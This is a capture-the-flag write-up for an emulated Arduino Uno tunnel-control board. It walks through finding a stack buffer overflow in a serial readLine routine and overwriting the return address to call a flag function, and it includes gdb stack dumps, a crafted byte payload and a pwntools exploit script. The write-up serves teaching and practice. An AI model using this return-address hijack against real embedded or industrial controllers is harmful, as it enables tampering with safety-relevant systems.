---
title: reto19
challenge_type: Pwn
difficulty: Insane
author: "@4nimanegra"
writeup_author: "@xabito"
competition: navarra-cyber-talent-25-4
summary: |-
  We have an industrial control board for a traffic tunnel control system managed by an Arduino Uno. The serial port is connected to a socket that we can connect to in order to communicate with it.
attachments:
  - title: challenge.ino.elf
    url: /assets/files/navarra-cyber-talent-25-4/reto19/challenge.ino.elf
  - title: challenge.c
    url: /assets/files/navarra-cyber-talent-25-4/reto19/challenge.c
connections:
  - url: nct25.thehackerconclave.es:26019
---

**Note:** This challenge was solved after the competition had ended, so we no longer had access to the socket. As a result, we had to execute the binary locally and were only able to obtain the dummy placeholder flag instead of the real one.

## Recon

We are presented with an **Arduino Uno** (a.k.a. `atmega328`) binary and source code. Let's first emulate it with QEMU, exposing the UART interface through a socket, to simulate the real challenge, and see what it does:

```bash
$ qemu-system-avr \
    -machine uno \
    -bios challenge.ino.elf \
    -nographic \
    -serial tcp:127.0.0.1:4444,server,nowait &

$ nc 127.0.0.1 4444
===== Sistema de Control de Tunel =====
1. Estado de Ventiladores
2. Nivel de CO2
3. Estado de Iluminacion
4. Historial de Alertas
5. Salir

Selecciona opcion: 1

--- Estado de Ventiladores ---
Ventilador 1: Activo
Ventilador 2: Activo
Ventilador 3: Activo
```

The program presents a menu with several options, each displaying different information before looping back to the menu. Let's review the most relevant sections of the source code:

```c
void showflag(){
  Serialprintln("\n\rWelcome to the system");
  Serialprintln("\n\rC0nclave{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}");
}

char readLine(char *out){
  char caracter;
  int i = 0;
  caracter = Serialread();
  while(caracter != '\n'){
    out[i++] = caracter;
    caracter = Serialread();
  }
  out[i] = '\0';
}

void loop(){
  char opcion[2];
  while(1){
    menuOpciones();
    readLine(opcion);
    Serialsend(opcion[0]);
    Serialprintln("");
    switch(opcion[0]){
      case '1': estadoVentiladores(); break;
      case '2': nivelCO2(); break;
      case '3': estadoIluminacion(); break;
      case '4': historialAlertas(); break;
      case '5': Serialprintln("\n\rSaliendo al menu principal..."); return;
      default: Serialprintln("\n\rOpcion invalida."); break;
    }
  }
}
```

In the `loop` function, a 2-byte array named `opcion` is defined and used to store the user's menu selection. The menu uses a `switch` statement to process the user's input. Notably, the fifth menu option (exit) executes a `return` statement rather than a `break`, causing the `loop` function to end and return control to its caller.

Examining the `readLine` function reveals a clear **buffer overflow** vulnerability. Although we are writing to a 2-byte array, input is continuously written until a newline character (`\n`) is received. This allows us to write an arbitrary number of bytes to the stack, well beyond the bounds of the array.

Our objective is clear: we need to execute the `showflag` function. To accomplish this, we must modify the return address stored on the stack during subroutine calls. Since our input is written directly to a variable declared within the `loop` function (`char opcion[2]`), we are effectively overwriting data on the stack frame of `loop`, including its return address.

By overwriting the return address, we can redirect execution to `showflag` once `loop` returns. This confirms that the use of `return` in the fifth menu option is indeed a crucial detail for exploitation.

## Exploitation

First, we must determine the starting address of the `showflag` function, as this is the address to which we want execution to jump after `loop` returns:

```bash
$ avr-nm challenge.ino.elf | grep showflag
00000096 T showflag
```

The address of `showflag` is `0x0096`. It is important to note a characteristic of the AVR platform: the program counter does not use byte-based addressing, but word-based addressing. Therefore, the value stored on the stack for a return address must refer to words rather than bytes. As a result, we need to divide the byte address by two. In this case, we must overwrite the return address on the stack with `0x0096 / 2 = 0x004b`.

Another important detail concerns endianness. Although these chips are little-endian, the program counter is pushed onto the stack in two steps: first, the lower byte is pushed, followed by the higher byte. As a result, when examining memory, the return address appears in big-endian order. It is essential to keep this in mind to craft the exploit.

So, let's show the dump of the `main` and `loop` functions to then understand where on the stack is the saved return address that we want to overwrite:

```bash
$ avr-objdump --disassemble=main challenge.ino.elf
00000642 <main>:
  642:  cf 93          push    r28
  644:  df 93          push    r29
  646:  cd b7          in      r28, 0x3d    ; 61
  648:  de b7          in      r29, 0x3e    ; 62
  64a:  0e 94 d3 02    call    0x5a6        ; 0x5a6 <setup>
  64e:  0e 94 dd 02    call    0x5ba        ; 0x5ba <loop>      # call to loop, push ret to stack
  652:  fd cf          rjmp    .-6          ; 0x64e <main+0xc>  # expected ret address in stack
```

```bash
$ avr-objdump --disassemble=loop challenge.ino.elf
000005ba <loop>:
  5ba:  cf 93          push    r28                              # push r28 to stack
  5bc:  df 93          push    r29                              # push r29 to stack
  5be:  00 d0          rcall   .+0          ; 0x5c0 <loop+0x6>  # char opcion[2];
  5c0:  cd b7          in      r28, 0x3d    ; 61
  5c2:  de b7          in      r29, 0x3e    ; 62
  5c4:  0e 94 3d 01    call    0x27a        ; 0x27a <menuOpciones>
  5c8:  ce 01          movw    r24, r28
  5ca:  01 96          adiw    r24, 0x01    ; 1
  5cc:  0e 94 08 01    call    0x210        ; 0x210 <readLine>  # call to readLine
```

Therefore, the stack layout after returning from the `readLine` function, up until the end of the `loop` function, should be as follows:

```
SP  →  OPT0  |  OPT1  |  saved R29  |  saved R28  |  caller RETH  |  caller RETL
```

Since we begin writing at `OPT0`, we need an offset of `4` bytes to reach the `RETL` byte on the stack. Then, we must overwrite the saved return address with the word address of `showflag`. Remember that this address should be written as a 16-bit value, in big-endian order, due to the way the program counter is pushed onto the stack. Thus, the complete payload is: `\x41\x41\x41\x41\x00\x4b\x0a`.

At this point, since we have not yet triggered the `return` instruction, the program will display the menu again. We need to select option `5` in order to reach the `return` statement and cause execution to jump to `showflag` and leak the flag.

To validate these assumptions, we will debug the program by examining the stack both before and after the execution of the `readLine` function. This will allow us to determine precisely where our input is placed in memory. To begin the debugging session, use the following commands:

```bash
$ qemu-system-avr \
    -machine uno \
    -bios challenge.ino.elf \
    -nographic \
    -serial tcp:127.0.0.1:4444,server,nowait \
    -S -gdb tcp::1234 &

$ avr-gdb challenge.ino.elf
(gdb) target remote :1234
Remote debugging using :1234
```

We set a breakpoint at `0x05cc`, just before the `readLine` function is called. Next, we connect to the program using `nc 127.0.0.1 4444` in a separate terminal and select the invalid menu option `A`. The following output shows the results of the `gdb` debugging session:

```bash
(gdb) break *0x5cc
(gdb) continue
Continuing.
Breakpoint 1, 0x000005cc in loop ()
(gdb) x/8bx $sp
0x8008f5: 0xe4  0x02  0xe0  0x08  0xfb  0x03  0x29  0x08
(gdb) stepi
0x00000210 in readLine ()
(gdb) next
(gdb) # select option A from the menu
0x000005d0 in loop ()
(gdb) x/8bx $sp
0x8008f5: 0xe8  0x41  0x00  0x08  0xfb  0x03  0x29  0x0
```

Let us analyze the contents of the stack:

```
Before: 0xe4  0x02  0xe0  0x08  0xfb  0x03  0x29  0x08
After:  0xe8  0x41  0x00  0x08  0xfb  0x03  0x29  0x0
              USER  NULL  R29   R28   RETH  RETL
```

**Note:** The AVR architecture uses an post-increment mechanism when pushing values onto the stack. This is why there is an extra byte at the beginning of the stack pointer, which is unrelated to our exploit.

As we can see, `RETH` and `RETL` together make up the word-based address `0x0329`. Multiplying this value by `2` gives us `0x0652`, which corresponds to the expected saved return address of the `main` function. Our input character is located exactly 4 bytes before this return address. This confirms that by crafting our payload as described, we can overwrite the saved return address as intended.

The following Python script transmits the payload as outlined above:

```python
from pwn import *

context.arch = 'avr'
context.log_level = 'info'

showflag_addr = 0x0096 // 2

p = remote('127.0.0.1', 4444)

p.recvuntil(b'Selecciona opcion: ', timeout=0.5)
p.sendline(b'A'*4 + p16(showflag_addr, endian='big'))

p.recvuntil(b'Selecciona opcion: ')
p.sendline(b'5')

response = p.recvall(timeout=0.5)

flag_match = re.search(rb'C0nclave\{[^}]+\}', response)
if flag_match:
    flag = flag_match.group(0).decode()
    log.success(f'Flag: {flag}')
```

## Flag capture

Running the exploit successfully yields the flag:

```
[+] Opening connection to 127.0.0.1 on port 4444: Done
[+] Receiving all data: Done (276B)
[*] Closed connection to 127.0.0.1 port 4444
[+] Flag: C0nclave{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```
